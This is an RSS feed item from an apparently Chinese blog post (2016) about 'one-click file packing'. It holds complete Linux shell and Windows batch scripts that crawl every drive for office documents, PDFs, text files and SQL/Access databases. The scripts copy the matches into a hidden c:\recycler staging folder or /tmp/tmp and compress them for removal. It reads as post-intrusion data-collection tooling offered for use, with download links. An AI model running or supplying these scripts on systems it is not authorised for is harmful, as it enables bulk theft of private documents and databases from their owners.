      </item>
    
      <item>
        <title>文件一键打包</title>
        <description>&lt;h4 id=&quot;x01-linux&quot;&gt;0x01 linux&lt;/h4&gt;

&lt;p&gt;linux打包命令:
&lt;a href=&quot;http://pan.baidu.com/s/1nvcVqOT&quot;&gt;1.sh&lt;/a&gt; 密码:0y03&lt;br /&gt;
(attention:without “&amp;amp;&amp;amp; echo ok”,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------content of 1.sh--------------------
mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
--------------------end-----------------------------

mysql:
mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.sql&quot; &amp;gt; /tmp/tmp/tmp.list  &amp;amp;&amp;amp; tar -T /tmp/tmp/tmp.list -czf /tmp/tmp/tmp.tar.gz  &amp;amp;&amp;amp; echo ok
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-windows&quot;&gt;0x02 windows&lt;/h4&gt;

&lt;p&gt;windows打包(rar|7z)命令:
&lt;a href=&quot;http://pan.baidu.com/s/1slMivlb&quot;&gt;1.bat&lt;/a&gt; 密码:3lwz&lt;br /&gt;
(attention:7z.exe for x32 need a 7z.dll to performs well while 7z.exe for x64 needn’t)
(rar.exe does not have the x86 or x64 isssue)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------content of 1.bat--------------------------
@echo off
goto :main
这是注释:(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 

if not exist c:\recycler (
md c:\recycler
md c:\recycler\tmp
        )

if exist c:\recycler (
rd /s/q c:\recycler\tmp
md c:\recycler\tmp
        )

echo  当前硬盘的分区有: 
for %%i in (%str%) do (
if exist %%i: (echo %%i:

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.doc&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; tmp.txt
)

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.docx&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.pdf&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.txt&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xls&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xlsx&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


)
)

copy rar.exe c:\recycler\rar.exe
echo &quot;y&quot; | del rar.exe

c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
echo ok
------------------end--------------------------------

or
c:\recycler\7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*


-------------------mysql&amp;amp;access.bat---------------------
@echo off
goto :main
这是注释:(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
mdf和ldf文件无法直接复制,需要shadow copy
dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 

if not exist c:\recycler (
md c:\recycler
md c:\recycler\tmp
        )

if exist c:\recycler (
rd /s/q c:\recycler\tmp
md c:\recycler\tmp
        )

echo  当前硬盘的分区有: 
for %%i in (%str%) do (
if exist %%i: (echo %%i:

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.sql&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.mdb&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)

)
)

copy rar.exe c:\recycler\rar.exe
echo &quot;y&quot; | del rar.exe

c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
echo ok
---------------------end-------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 20 May 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</link>
        <guid isPermaLink="true">/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</guid>
        
        <category>windows</category>
        
        <category>dir /s</category>
        
        <category>sh</category>
        
        <category>7z</category>
        
        <category>tar</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
